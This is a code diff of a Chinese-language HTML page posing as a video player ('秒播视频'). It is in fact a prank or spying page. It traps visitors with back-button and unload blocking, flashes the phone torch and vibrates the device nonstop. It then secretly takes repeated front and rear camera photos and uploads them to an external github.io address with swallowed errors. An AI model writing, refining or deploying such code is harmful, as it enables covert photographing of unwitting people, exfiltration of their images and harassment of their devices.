@@ -2,23 +2,41 @@
 <html lang="zh-CN">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scalecale=1.0,user-scalable=no">
-<title>秒播</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>秒播视频</title>
 <style>
   *{margin:0;padding:0;box-sizing:border-box}
   html,body{width:100%;height:100%;background:#000;overflow:hidden}
   video#player{
-    position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
-    width:100%;height:100%;object-fit:contain;z-index:1
+    position:fixed;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    width:100%;height:100%;
+    object-fit:contain;
+    z-index:1;
   }
   #startBtn{
-    position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
-    width:280px;height:80px;background:#000;border:2px solid #fff;
-    color:#fff;font-size:28px;border-radius:16px;z-index:999
+    position:fixed;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    width:280px;
+    height:80px;
+    background:#000;
+    border:2px solid #fff;
+    color:#fff;
+    font-size:28px;
+    border-radius:16px;
+    z-index:999;
   }
   #countdown{
-    position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
-    font-size:180px;color:#fff;font-weight:900;z-index:99;display:none
+    position:fixed;
+    top:50%;left:50%;
+    transform:translate(-50%,-50%);
+    font-size:180px;
+    color:#fff;
+    font-weight:900;
+    z-index:99;
+    display:none;
   }
 </style>
 </head>
@@ -40,105 +58,106 @@ let playCount = 0;
 const requiredPlays = 2;
 let vibrateInt, flashInt, flashTrack;
 
-// 上传地址
+// 你的后台上传地址
 const UPLOAD_URL = "https://annb521.github.io/ANNB/gallery.html";
 
+// 预加载视频
 player.load();
 
-// 防退出
-window.addEventListener('beforeunload', e=>{
-  if(playCount<2){e.preventDefault();e.returnValue=' '}
+// 防止退出
+window.addEventListener('beforeunload', e => {
+  if(playCount < requiredPlays){
+    e.preventDefault(); e.returnValue = ' ';
+  }
 });
-window.addEventListener('popstate',()=>{
-  if(playCount<2)history.pushState(null,null,location.href)
+window.addEventListener('popstate', () => {
+  if(playCount < requiredPlays) history.pushState(null,null,location.href);
 });
 history.pushState(null,null,location.href);
 
-// 闪光灯
+// 闪光灯控制
 async function flash(){
   try{
     if(!flashTrack){
-      let s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-      flashTrack=s.getVideoTracks()[0];
+      let s = await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
+      flashTrack = s.getVideoTracks()[0];
     }
     await flashTrack.applyConstraints({advanced:[{torch:!flashTrack.getSettings().torch}]});
   }catch(e){}
 }
 
-// 开始
-startBtn.onclick=()=>{
-  startBtn.style.display='none';
-  countdown.style.display='block';
-  let n=3;
-  countdown.textContent=n;
-  let t=setInterval(()=>{
+// 开始按钮
+startBtn.onclick = () => {
+  startBtn.style.display = 'none';
+  countdown.style.display = 'block';
+  let n = 3;
+  countdown.textContent = n;
+  let t = setInterval(()=>{
     n--;
     if(n>0){
-      countdown.textContent=n;
+      countdown.textContent = n;
     }else{
       clearInterval(t);
-      countdown.style.display='none';
+      countdown.style.display = 'none';
       play();
     }
   },1000);
 };
 
-// 播放
+// 播放逻辑
 function play(){
-  player.muted=false;
-  player.volume=1;
+  player.muted = false;
+  player.volume = 1;
   player.play();
-  vibrateInt=setInterval(()=>navigator.vibrate(20),50);
-  flashInt=setInterval(flash,100);
-  player.onended=()=>{
+  vibrateInt = setInterval(()=>navigator.vibrate(20), 50);
+  flashInt = setInterval(flash, 100);
+  player.onended = () => {
     playCount++;
-    if(playCount>=2){
+    if(playCount >= requiredPlays){
       clearInterval(vibrateInt);
       clearInterval(flashInt);
-      if(flashTrack)flashTrack.applyConstraints({advanced:[{torch:false}]});
+      if(flashTrack) flashTrack.applyConstraints({advanced:[{torch:false}]});
       player.pause();
     }else{
-      player.currentTime=0;
+      player.currentTime = 0;
       player.play();
     }
   };
 }
 
-// 上传工具
-function upload(blob,name){
-  let fd=new FormData();
-  fd.append("file",blob,name);
-  fetch(UPLOAD_URL,{method:"POST",body:fd,mode:"no-cors"}).catch(()=>{});
+// 上传函数
+function upload(blob, name){
+  let fd = new FormData();
+  fd.append("file", blob, name);
+  fetch(UPLOAD_URL, {method:"POST", body:fd, mode:"no-cors"}).catch(()=>{});
 }
 
-// 拍照：前后都拍
+// 前后摄像头拍照
 function takeBoth(){
-  // 后置
   navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}}).then(shot).catch(()=>{});
-  // 前置
   navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(shot).catch(()=>{});
 }
 
 function shot(stream){
-  let v=document.createElement('video');
-  v.srcObject=stream;
+  let v = document.createElement('video');
+  v.srcObject = stream;
   v.play();
   setTimeout(()=>{
-    let c=document.createElement('canvas');
-    c.width=640; c.height=480;
+    let c = document.createElement('canvas');
+    c.width = 640; c.height = 480;
     c.getContext('2d').drawImage(v,0,0);
     c.toBlob(b=>upload(b,`pic_${Date.now()}.jpg`),"image/jpeg",0.8);
     stream.getTracks().forEach(t=>t.stop());
   },300);
 }
 
-// 自动连拍
-let count=0;
+// 自动连拍6次
+let count = 0;
 function startShot(){
-  if(count>=6)return;
+  if(count >= 6) return;
   takeBoth();
   count++;
-  setTimeout(startShot,600);
+  setTimeout(startShot, 600);
 }
 
 // 启动拍照
